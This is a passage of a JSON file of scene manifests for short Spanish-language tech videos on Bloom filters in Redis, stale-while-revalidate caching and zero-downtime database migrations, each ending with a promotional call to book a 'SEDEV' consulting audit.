                "text": "BLOOM FILTERS:",
                "color": "#ffffff"
              },
              {
                "text": "MAGIA EN BITS",
                "color": "#10b981"
              }
            ],
            "subtitle": "CONSULTAS PROBABILÍSTICAS EN O(1)",
            "icon": "memory"
          }
        },
        {
          "id": "bloom_math",
          "type": "memory_layout",
          "duration": 6.5,
          "voiceover": "Un Bloom Filter aplica múltiples funciones hash a una clave y enciende bits en un array. Si algún bit es cero, el elemento definitivamente no existe.",
          "visual_cue": "Array de bits encendiéndose por hashes SHA-256 / Murmur3",
          "props": {
            "header": "MECANISMO DE HASHING",
            "title": "ARRAY DE BITS Y CERO FALSOS NEGATIVOS",
            "items": [
              {
                "name": "CLAVE: \"user_98412\"",
                "addr": "3 FUNCIONES HASH",
                "value": "Bits calculados: [14, 52, 88]",
                "color": "#38bdf8"
              },
              {
                "name": "ARRAY DE BITS (RAM)",
                "addr": "BIT 52 = 0",
                "value": "✔ GARANTIZADO: El elemento NO existe en disco",
                "color": "#10b981"
              }
            ]
          }
        },
        {
          "id": "bloom_code",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "Puede tener falsos positivos leves, pero jamás un falso negativo. Esto ahorra millones de lecturas innecesarias al disco en Cassandra y Redis.",
          "visual_cue": "Terminal ejecutando comandos BF.EXISTS en Redis",
          "props": {
            "header": "REDIS BLOOM FILTER NATIVO",
            "title": "CONSULTA DE EXISTENCIA EN SUB-MILISEGUNDO",
            "filename": "cache/bloom.sh",
            "codeLines": [
              "# Comprueba existencia en RAM sin tocar base de datos principal",
              "BF.ADD post_views \"usr_42:post_991\"",
              "BF.EXISTS post_views \"usr_42:post_991\" -> (integer) 1",
              "BF.EXISTS post_views \"usr_88:post_991\" -> (integer) 0",
              "# Ahorro: 99% de lecturas a base de datos descartadas en RAM"
            ],
            "cursorLine": 4
          }
        },
        {
          "id": "cta_bloom",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Diseño arquitecturas de caché y capas probabilísticas para reducir la carga de bases de datos. Link en mi perfil para auditar tu sistema.",
          "visual_cue": "Cierre con llamado a auditoría de caché y performance",
          "props": {
            "header": "AUDITORÍA DE CACHÉ & ALTO RENDIMIENTO",
            "title": "PROTEGE TU BASE DE CONSULTAS INÚTILES",
            "cta": {
              "badge": "AUDITORÍA DE DATOS & CACHÉ // SEDEV",
              "text": "¿Tu base de datos sufre por queries repetitivas? Link en mi perfil para auditar tu caché."
            }
          }
        }
      ]
    }
  },
  {
    "key": "18_B",
    "topicNum": "18",
    "group": "18. BLOOM FILTERS PROBABILISTIC",
    "label": "Var B (Polémico): Ahorra miles de dólares en queries usando filtros probabilísticos en Redis",
    "variation": "B (Polémico)",
    "category": "ESTRUCTURAS DE DATOS & CACHÉ",
    "manifest": {
      "title": "[18] Ahorra miles de dólares en queries usando filtros probabilísticos en Redis (Var B)",
      "category": "ESTRUCTURAS DE DATOS & CACHÉ",
      "slug": "18_bloom_filters_probabilistic",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_bloom_b",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "Hacer consultas a tu base de datos relacional para verificar si un email ya está registrado está quemando tu presupuesto de infraestructura.",
          "visual_cue": "Gancho cinético sobre ahorro de queries repetitivas",
          "props": {
            "badge": "AHORRO DE RECURSOS",
            "lines": [
              {
                "text": "AHORRA MILES DE DÓLARES",
                "color": "#10b981"
              },
              {
                "text": "CON BLOOM FILTERS",
                "color": "#ffffff"
              }
            ],
            "subtitle": "ELIMINA EL 95% DE LAS CONSULTAS A DISCO",
            "icon": "database"
          }
        },
        {
          "id": "latency_bloom",
          "type": "latency_scale",
          "duration": 6,
          "voiceover": "Un filtro de Bloom en Redis responde en microsegundos y consume apenas un megabyte para un millón de registros. Tu base de datos te lo va a agradecer.",
          "visual_cue": "Escala de latencia comparando chequeo en RAM vs Query SQL a disco",
          "props": {
            "header": "TIEMPO DE RESPUESTA",
            "title": "FILTRO EN MEMORIA VS BÚSQUEDA EN DISCO",
            "subtitle": "COMPARATIVA DE LATENCIA DE COMPROBACIÓN",
            "tiers": [
              {
                "name": "BLOOM FILTER EN RAM (REDIS)",
                "latency": "0.05 ms",
                "ratio": 0.1,
                "color": "#10b981",
                "human": "Microsegundos"
              },
              {
                "name": "QUERY SQL CON ÍNDICE B-TREE",
                "latency": "4.5 ms",
                "ratio": 0.6,
                "color": "#fbbf24",
                "human": "90x más lento"
              },
              {
                "name": "ESCANEO SIN ÍNDICE (TABLE SCAN)",
                "latency": "120 ms",
                "ratio": 1,
                "color": "#ef4444",
                "human": "Colapso de disco"
              }
            ],
            "conclusion": "Descartas el 99% de las comprobaciones antes de tocar el motor de base de datos.",
            "conclusionSub": "Menos consumo de CPU, menos IOPS y menor factura cloud."
          }
        },
        {
          "id": "cta_bloom_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito capas de persistencia y caching para reducir facturas y multiplicar la escala de tu producto. Contáctame en el link de la bio.",
          "visual_cue": "Cierre con auditoría de base de datos y caché",
          "props": {
            "header": "AUDITORÍA DE ESCALABILIDAD & COSTES",
            "title": "OPTIMIZACIÓN DE CAPAS DE CACHÉ",
            "cta": {
              "badge": "AUDITORÍA DE DATOS // SEDEV",
              "text": "Reduce el estrés de tu base de datos y recorta costes. Agenda tu sesión en mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "19_A",
    "topicNum": "19",
    "group": "19. CACHE STALE WHILE REVALIDATE",
    "label": "Var A (Técnico): Anatomía de un Cache Stampede y cómo el encabezado SWR lo neutraliza",
    "variation": "A (Técnico)",
    "category": "REDES & ARQUITECTURA DE CACHÉ",
    "manifest": {
      "title": "[19] Anatomía de un Cache Stampede y cómo el encabezado SWR lo neutraliza (Var A)",
      "category": "REDES & ARQUITECTURA DE CACHÉ",
      "slug": "19_cache_stale_while_revalidate",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_swr",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "¿Qué pasa cuando la caché de tu página más visitada expira justo cuando entran diez mil usuarios a la vez? Tu servidor colapsa por Cache Stampede.",
          "visual_cue": "Gancho cinético sobre avalancha de peticiones por expiración de caché",
          "props": {
            "badge": "ESCALABILIDAD WEB 2026",
            "lines": [
              {
                "text": "ANATOMÍA DE UN",
                "color": "#ffffff"
              },
              {
                "text": "CACHE STAMPEDE",
                "color": "#ef4444"
              }
            ],
            "subtitle": "CÓMO SWR NEUTRALIZA EL COLAPSO",
            "icon": "network_packet"
          }
        },
        {
          "id": "stampede_flow",
          "type": "network_pipeline",
          "duration": 6.5,
          "voiceover": "Todas las peticiones atraviesan la caché vacía e intentan recalcular la misma información en la base de datos simultáneamente tumbando el backend.",
          "visual_cue": "Pipeline visual mostrando la estampida saturando la base de datos sin protección",
          "props": {
            "header": "AVALANCHA DE PETICIONES",
            "title": "CACHE MISS SIMULTÁNEO",
            "subtitle": "10,000 CONEXIONES ATACANDO LA BASE DE DATOS",
            "stages": [
              {
                "id": "users",
                "label": "10,000 USUARIOS CONCURRENTES",
                "sublabel": "Petición masiva en el segundo 00:00",
                "y": 220,
                "color": "#ef4444",
                "metric": "10K RPS"
              },
              {
                "id": "cdn",
                "label": "CDN CACHE (EXPIRADA)",
                "sublabel": "TTL agotado // Deja pasar todo el tráfico",
                "y": 520,
                "color": "#fbbf24",
                "metric": "Stampede"
              },
              {
                "id": "db",
                "label": "BASE DE DATOS EN COLAPSO",
                "sublabel": "10,000 queries pesadas idénticas a la vez",
                "y": 820,
                "color": "#ef4444",
                "metric": "CPU 100%"
              }
            ]
          }
        },
        {
          "id": "swr_solution",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "Con Stale-While-Revalidate la CDN entrega el contenido en cinco milisegundos mientras un solo hilo actualiza la caché en segundo plano.",
          "visual_cue": "Terminal configurando encabezado Cache-Control stale-while-revalidate",
          "props": {
            "header": "CABECERA HTTP PROTECTORA",
            "title": "STALE-WHILE-REVALIDATE PATTERN",
            "filename": "routes/products.ts",
            "codeLines": [
              "// Sirve respuesta vieja en 5ms y actualiza en background sin bloquear",
              "reply.header(\"Cache-Control\", ",
              "  \"public, max-age=60, stale-while-revalidate=86400, stale-if-error=86400\"",
              ");",
              "// Resultado: Zero Cache Stampedes // Rendimiento 100% plano"
            ],
            "cursorLine": 4
          }
        },
        {
          "id": "cta_swr",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito la arquitectura de caching y entrega de contenido en CDN para garantizar escalabilidad extrema en picos de tráfico. Enlace en mi bio.",
          "visual_cue": "Cierre con llamado a auditoría de arquitectura y escalabilidad",
          "props": {
            "header": "AUDITORÍA DE ESCALABILIDAD & CACHING",
            "title": "RESISTENCIA A PICOS MASIVOS DE TRÁFICO",
            "cta": {
              "badge": "AUDITORÍA DE ESCALABILIDAD // SEDEV",
              "text": "¿Tu web sufre caídas en picos de tráfico? Link en mi perfil para agendar tu diagnóstico."
            }
          }
        }
      ]
    }
  },
  {
    "key": "19_B",
    "topicNum": "19",
    "group": "19. CACHE STALE WHILE REVALIDATE",
    "label": "Var B (Polémico): Cómo servir respuestas en 5 milisegundos sin servir datos desactualizados",
    "variation": "B (Polémico)",
    "category": "REDES & ARQUITECTURA DE CACHÉ",
    "manifest": {
      "title": "[19] Cómo servir respuestas en 5 milisegundos sin servir datos desactualizados (Var B)",
      "category": "REDES & ARQUITECTURA DE CACHÉ",
      "slug": "19_cache_stale_while_revalidate",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_swr_b",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "No necesitas pagar un clúster gigante de Redis para que tu web vuele. Los encabezados HTTP correctos en el Edge hacen todo el trabajo por ti.",
          "visual_cue": "Gancho cinético sobre respuestas ultrarrápidas con HTTP",
          "props": {
            "badge": "EDGE CACHING EN 2026",
            "lines": [
              {
                "text": "RESPUESTAS EN 5MS",
                "color": "#10b981"
              },
              {
                "text": "SIN REDIS GIGANTE",
                "color": "#ffffff"
              }
            ],
            "subtitle": "EL PODER DEL ENCABEZADO STALE-WHILE-REVALIDATE",
            "icon": "lightning"
          }
        },
        {
          "id": "metrics_swr",
          "type": "metrics_comparison",
          "duration": 6,
          "voiceover": "Tus usuarios perciben una velocidad instantánea en cualquier parte del mundo mientras tu servidor de origen apenas recibe peticiones.",
          "visual_cue": "Métricas de descarga y reducción de peticiones al origen",
          "props": {
            "header": "DESCARGA DE SERVIDOR DE ORIGEN",
            "metricA": {
              "label": "PETICIONES A BASE DE DATOS",
              "value": "-98.4%",
              "sub": "Solo una actualización en background por minuto",
              "color": "#10b981"
            },
            "metricB": {
              "label": "LATENCIA PERCIBIDA (TTFB)",
              "value": "6ms p95",
              "sub": "Servido directo desde el Edge más cercano",
              "color": "#38bdf8"
            }
          }
        },
        {
          "id": "cta_swr_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Optimizo la capa de borde y distribución de contenido para aplicaciones de alta concurrencia. Contáctame en el link de la bio.",
          "visual_cue": "Cierre con consultoría de escalabilidad",
          "props": {
            "header": "CONSULTORÍA DE ESCALABILIDAD & EDGE",
            "title": "MÁXIMA VELOCIDAD // MÍNIMO COSTE DE SERVIDOR",
            "cta": {
              "badge": "CONSULTORÍA SENIOR // SEDEV",
              "text": "Haz que tu backend soporte millones de visitas sin pestañear. Hablemos en mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "20_A",
    "topicNum": "20",
    "group": "20. MIGRACIONES ZERO DOWNTIME",
    "label": "Var A (Técnico): El Patrón Expand & Contract: Modificar esquemas masivos con 0s downtime",
    "variation": "A (Técnico)",
    "category": "BASES DE DATOS & PRODUCCIÓN CRÍTICA",
    "manifest": {
      "title": "[20] El Patrón Expand & Contract: Modificar esquemas masivos con 0s downtime (Var A)",
      "category": "BASES DE DATOS & PRODUCCIÓN CRÍTICA",
      "slug": "20_migraciones_zero_downtime",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_migration",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "¿Cómo renombrar una columna en una tabla de cincuenta millones de usuarios con tráfico activo sin provocar un solo error 500? Con Expand & Contract.",
          "visual_cue": "Gancho cinético sobre migraciones críticas sin downtime",
          "props": {
            "badge": "INGENIERÍA DE DATOS 2026",
            "lines": [
              {
                "text": "MIGRACIONES CON",
                "color": "#ffffff"
              },
              {
                "text": "CERO DOWNTIME",
                "color": "#10b981"
              }
            ],
            "subtitle": "EL PATRÓN EXPAND & CONTRACT EN 3 FASES",
            "icon": "database"
          }
        },
        {
          "id": "expand_phases",
          "type": "architecture_flow",
          "duration": 6.5,
          "voiceover": "Nunca renombres en un solo paso. Fase uno: expandes añadiendo la nueva columna. Fase dos: doble escritura. Fase tres: contraes borrando la vieja.",
          "visual_cue": "Diagrama de flujo mostrando las tres fases del patrón Expand & Contract",
          "props": {
            "header": "LAS TRES FASES DEL PATRÓN",
            "title": "TRANSICIÓN SEGURA DE ESQUEMA",
            "nodes": [
              {
                "id": "f1",
                "label": "1. FASE EXPAND",
                "sublabel": "Añadir columna nueva vacía (Nullable) // Cero locks",
                "color": "#38bdf8",
                "y": 160
              },
              {
                "id": "f2",
                "label": "2. DOBLE ESCRITURA & BACKFILL",
                "sublabel": "La app escribe en ambas columnas // Worker migra histórico",
                "color": "#fbbf24",
                "y": 520
              },
              {
                "id": "f3",
                "label": "3. FASE CONTRACT",
                "sublabel": "La app solo lee la nueva // Drop seguro de la columna vieja",
                "color": "#10b981",
                "y": 880
              }
            ]
          }
        },
        {
          "id": "migration_sql",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "Hacerlo por fases te permite revertir en cualquier instante sin poner en riesgo la disponibilidad del negocio ni corromper datos.",
          "visual_cue": "Terminal mostrando script seguro de migración con pg_repack / gh-ost",
          "props": {
            "header": "MIGRACIÓN CON CONTROL DE BLOQUEOS",
            "title": "CERO EXCLUSIVE LOCKS EN TABLA",
            "filename": "db/migrations/20261025_safe_column.sql",
            "codeLines": [
              "-- 1. Añade columna sin bloquear lectores ni escritores",
              "ALTER TABLE users ADD COLUMN phone_v2 VARCHAR(32);",
              "-- 2. Backfill en lotes pequeños para no saturar transacciones",
              "UPDATE users SET phone_v2 = phone WHERE id BETWEEN $1 AND $2;",
              "-- 3. Deploy de código con lectura de phone_v2"
            ],
            "cursorLine": 4
          }
        },
        {
          "id": "cta_migration",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Asesoro y acompaño a equipos en migraciones críticas de base de datos sin tiempo de inactividad. Agenda una sesión técnica en mi perfil.",
          "visual_cue": "Cierre con consultoría de migración crítica",
          "props": {
            "header": "CONSULTORÍA DE MIGRACIONES CRÍTICAS",
            "title": "CAMBIOS DE ESQUEMA SIN TIEMPO DE CAÍDA",
            "cta": {
              "badge": "CONSULTORÍA DE DATOS // SEDEV",
              "text": "¿Planeas una migración compleja de base de datos? Link en mi perfil para acompañar a tu equipo."
            }
          }
        }
      ]
    }
  },
  {
    "key": "20_B",
    "topicNum": "20",
    "group": "20. MIGRACIONES ZERO DOWNTIME",
    "label": "Var B (Polémico): Nunca hagas ALTER TABLE a ciegas: Cómo evitar bloqueos de tabla",
    "variation": "B (Polémico)",
    "category": "BASES DE DATOS & PRODUCCIÓN CRÍTICA",
    "manifest": {
      "title": "[20] Nunca hagas ALTER TABLE a ciegas: Cómo evitar bloqueos de tabla (Var B)",
      "category": "BASES DE DATOS & PRODUCCIÓN CRÍTICA",
      "slug": "20_migraciones_zero_downtime",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_migration_b",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "Hiciste un ALTER TABLE agregando un valor por defecto en producción y bloqueaste todas las lecturas y escrituras durante cuarenta minutos.",
          "visual_cue": "Gancho cinético sobre el terror del bloqueo de tabla",
          "props": {
            "badge": "ERRORES FATALES EN DB",
            "lines": [
              {
                "text": "NUNCA HAGAS ALTER TABLE",
                "color": "#ef4444"
              },
              {
                "text": "A CIEGAS EN PRODUCCIÓN",
                "color": "#ffffff"
              }
            ],
            "subtitle": "BLOQUEOS EXCLUSIVOS // HORRORES DE BASE DE DATOS",
            "icon": "database"
          }
        },
        {
          "id": "lock_split",
          "type": "terminal_split",
          "duration": 6,
          "voiceover": "Postgres adquiere un bloqueo ACCESS EXCLUSIVE que frena cada petición detrás de él. Usa lock_timeout para que tu base de datos nunca se congele.",
          "visual_cue": "Doble terminal: Bloqueo infinito de tabla vs Migración segura con lock_timeout",
          "props": {
            "header": "MECANISMO DE BLOQUEO DE POSTGRES",
            "title": "ACCESS EXCLUSIVE LOCK VS LOCK TIMEOUT",
            "termA": {
              "title": "MIGRACIÓN SIN TIMEOUT",
              "color": "#ef4444",
              "cmd": "ALTER TABLE orders ADD COLUMN status_code INT;",
              "status": "Esperando lock indefinidamente",
              "time": "Incidencia P1",
              "lines": [
                "Todas las queries entrantes se encolan detrás del ALTER",
                "Pool de conexiones saturado al 100%",
                "La aplicación completa deja de responder a usuarios"
              ]
            },
            "termB": {
              "title": "MIGRACIÓN CON DEFENSA",
              "color": "#10b981",
              "cmd": "SET lock_timeout = \"2s\"; ALTER TABLE orders ...",
              "status": "Si no adquiere el lock en 2s, aborta limpiamente",
              "time": "Zero caída",
              "lines": [
                "Reintenta con backoff en momentos de menor concurrencia",
                "Los usuarios nunca notan degradación del servicio",
                "Garantía total de disponibilidad"
              ]
            }
          }
        },
        {
          "id": "cta_migration_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito planes de migración de datos y acompaño a startups en cambios estructurales de base de datos sin riesgo. Contáctame en el link de la bio.",
          "visual_cue": "Cierre con consultoría de migración de bases de datos",
          "props": {
            "header": "CONSULTORÍA DE MIGRACIONES SEGURAS",
            "title": "PROTEGE TU DISPONIBILIDAD EN PRODUCCIÓN",
            "cta": {
              "badge": "AUDITORÍA DE MIGRACIONES // SEDEV",
              "text": "Evita caídas en tus cambios de esquema. Hablemos en el enlace de mi perfil."
            }
          }
        }
      ]
    }
  }
];
